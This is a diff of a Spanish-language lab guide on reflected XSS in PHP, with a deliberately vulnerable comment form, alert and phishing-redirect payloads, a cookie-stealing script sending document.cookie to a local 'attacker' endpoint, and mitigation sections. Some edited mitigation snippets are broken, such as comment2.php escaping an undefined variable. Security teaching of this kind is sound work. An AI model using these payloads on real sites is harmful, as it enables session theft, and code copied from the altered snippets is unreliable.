@@ -17,9 +17,9 @@ Cross-Site Scripting (XSS) ocurre cuando una aplicación no valida ni sanitiza l
 scripts maliciosos se ejecuten en el navegador de otros usuarios.
 
 Tipos de XSS:
-- **Reflejado**: Se ejecuta inmediatamente al hacer la solicitud con un payload>
-- **Almacenado**: El script se guarda en la base de datos y afecta a otros usua>
-- **DOM-Based**: Se inyecta código en la estructura DOM sin que el servidor lo >
+- **Reflejado**: Se ejecuta inmediatamente al hacer la solicitud con un payload malicioso.
+- **Almacenado**: El script se guarda en la base de datos y afecta a otros usuarios.
+- **DOM-Based**: Se inyecta código en la estructura DOM sin que el servidor lo detecte
 
 ---
 ## ACTIVIDADES A REALIZAR
@@ -27,11 +27,11 @@ Tipos de XSS:
 
 > Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Inyección SQL](./files/ExplotacionYMitigacionXSS.pdf) de Raúl Fuentes. Nos va a seguir de guía para aprender a explotar y mitigar ataques de inyección XSS Reflejado en nuestro entorno de pruebas.
  
-> También y como marco de referencia, tienes [ la sección de correspondiente de ataque XSS reglejado de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting).
+> También y como marco de referencia, tienes [la sección de correspondiente de ataque XSS reglejado de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting).
 
 Vamos realizando operaciones:
 
-### Código vulnerable
+## Código vulnerable
 ---
 Crear el archivo vulnerable comment.php:
 
@@ -60,13 +60,18 @@ El Código no sanitiza la entrada del usuario, lo que permite inyectar scripts m
 
 Abrir el navegador y acceder a la aplicación: <http://localhost/comment.php>
 
+** Explotación 1**
 Ingresar el siguiente código en el formulario:
 
-`<script>alert('XSS ejecutado!')</script>`
+~~~
+<script>alert('XSS ejecutado!')</script>
+~~~
 
 Si aparece un mensaje de alerta (alert()) en el navegador, significa que la aplicación es vulnerable.
 
 ![](images/xss2.png)
+
+**Explotación 2**
 
 Podríamos redirigir a una página de phishing:
 
@@ -75,36 +80,42 @@ Podríamos redirigir a una página de phishing:
 ![](images/xss3.png)
 
 
-**Podemos capturar cookies del usuario (en ataques reales):**
+**Capturar cookies del usuario (en ataques reales):**
 ---
-Con esto, un atacante podría robar sesiones de usuarios.
+Con este ataque, un atacante podría robar sesiones de usuarios.
 
+- Primero preparamos el **servidor atacante**:
+
+En el caso de que estés utilizando la máquina docker de la pila LAMP, recuerda que tienes que conectarte al servicio docker  php83 primero:
+~~~
+docker exec -it lamp-php83 /bin/bash
+~~~
+
+Crea en tu servidor web una carpeta con nombre cookieStealer y carpetas asociadas:
+~~~
+mkdir /var/www/html/cookieStealer/
+touch /var/www/html/cookieStealer/index.php
+touch /var/www/html/cookieStealer/cookies.txt
+chmod 777 /var/www/html/cookieStealer/cookies.txt
+~~~
+ 
+> Si estamos con la Pila LAMP también lo podemos hacer directamente en la ruta _./www/cookieStealer_
+
+Copia en el archivo coockieStealer/index.php [este archivo php](files/steal.php)
+ - Ataque: Si insertamos en el comentario el siguiente script
 ~~~
 <script>document.write('<img src="http://localhost/cookieStealer/index.php?cookie='+document.cookie+'">')</script>`
 ~~~
 
 ![](images/xss4.png)
 
-Si lo quieres ver, crea en tu servidor web una carpeta con nombre cookieStealer y copias en el archivo coockieStealer/index.php [este archivo php](files/steal.php)
-En el caso de que estés utilizando la máquina docker de la pila LAMP, recuerda que tienes que conectarte al servidor PHP primero
-~~~
-docker exec -it lamp-php83 /bin/bash
-~~~
-creamos directorios y ficheros:
-~~~
-mkdir /var/www/html/cookieStealer/
-touch /var/www/html/cookieStealer/index.php
-touch /var/www/html/cookieStealer/cookies.txt
-chmod 777 /var/www/html/cookieStealer/cookies.txt
-
-~~~
-
-En el archivo cookie.txt del servidor del atacante se habrá guardado los datos de nuestra cookie:
+En el archivo **cookie.txt** del servidor del atacante se habrán guardado los datos de nuestra cookie:
 
 ![](images/xss8.png)
 
 Puedes investigar más en <https://github.com/TheWation/PhpCookieStealer/tree/master>
-### **Mitigación**
+
+## **Mitigación**
 ---
 **Uso de filter_input() para filtrar caracteres.**
 ---
@@ -126,14 +137,6 @@ function filter_string_polyfill(string $string): string
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Obtener y sanitizar el comentario
     $comment = filter_string_polyfill($_POST['comment'] ?? ''); // Usamos '??' para manejar el caso de que no se haya enviado ningún comentario
-    $comment = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
-
-    // Validación
-    if (!empty($comment) && strlen($comment) <= 500) {
-        echo "Comentario publicado: " . $comment;
-    } else {
-        echo "Error: El comentario no puede estar vacío y debe tener máximo 500 caracteres.";
-    }
 }
 ?>
 
@@ -146,11 +149,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 ![](files/xss5.png)
 
-Creamos una función filter_string_polyfill que nos va a eliminar todos los caracteres nulos y nos cambia caracteres conflictivos.
+La función que hemos creado al principio del documento: filter_string_polyfill nos va a eliminar todos los caracteres peligrosos y nos cambia caracteres conflictivos.
 
 **Sanitizar la entrada con htmlspecialchars()**
 ---
-htmlspecialchars() convierte caracteres especiales en texto seguro:
+htmlspecialchars() convierte caracteres especiales en sus equivalentes entidades HTML. Esto garantiza que incluso si el usuario ingresa una cadena que contiene etiquetas o código HTML, se mostrará como texto sin formato en lugar de que el navegador lo ejecute.
 - <script> → &lt;script&gt;
 - " → &quot;
 - ' → &#39;
@@ -162,8 +165,10 @@ Crea un archivo comment2.php con el siguiente contenido
 ~~~
 <?php
 if (isset($_POST['comment'])) {
-	$comment = htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8');
-	echo "Comentario publicado: " . $comment;
+        // para manejar el caso de que no se haya enviado ningún comentario
+    // htmlspecialchars convierte caracteres especiales en equivalentes html
+    $comment = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
+
 }
 ?>
 <form method="post">
@@ -244,7 +249,11 @@ if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_tok
 die("Error: Token CSRF inválido.");
 }
 ~~~
+
+## Código Seguro
+
 Estas modificaciones previenen ataques de falsificación de solicitudes (CSRF).
+
 Crea el archivo comment4.php con todas las mitigaciones:
 ~~~
 <?php
